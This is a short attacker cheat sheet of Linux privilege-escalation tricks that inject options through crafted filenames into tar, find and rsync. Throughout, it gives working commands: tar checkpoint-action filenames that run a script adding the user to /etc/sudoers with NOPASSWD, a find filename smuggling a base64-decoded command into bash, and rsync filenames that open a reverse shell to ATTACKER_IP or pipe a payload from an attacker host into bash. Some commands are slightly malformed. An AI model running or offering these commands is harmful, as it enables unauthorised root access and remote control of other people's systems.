

=== tar privilege escalation ==
```
Step 1: Go to /opt/admin

cd /opt/admin

Step 2: Create malicious filenames (these become tar options)

echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh privesc.sh"

Alternatively,

touch ./--checkpoint=1
touch ./--checkpoint-action=exec=sh\ shell.sh

Step 3: Create a root privilege escalation script

echo 'echo "youruser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > privesc.sh
chmod +x privesc.sh
```


== Find ==
```
/usr/bin/find . type f -not -regex '.*\.\(jpg\|png\\gif\)' -exec bash -c "rm -f {}"\;
touch ./"file.exe; echo base64_string= | base64 -d | bash"

```

== rsync ==
Way 1:
echo "" > '-e sh shell.txt';
rsync -a -e 'ssh -p 2222' *.txt root@localhost:/tmp/

Way 2:
echo "" > '-e bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" shell.txt'
rsync -a *.txt root@localhost:/tmp/

Way 3:
echo "" > '-e bash -c "curl -s http://attacker/payload.sh | bash" shell.txt'
rsync -a *.txt root@localhost:/tmp/
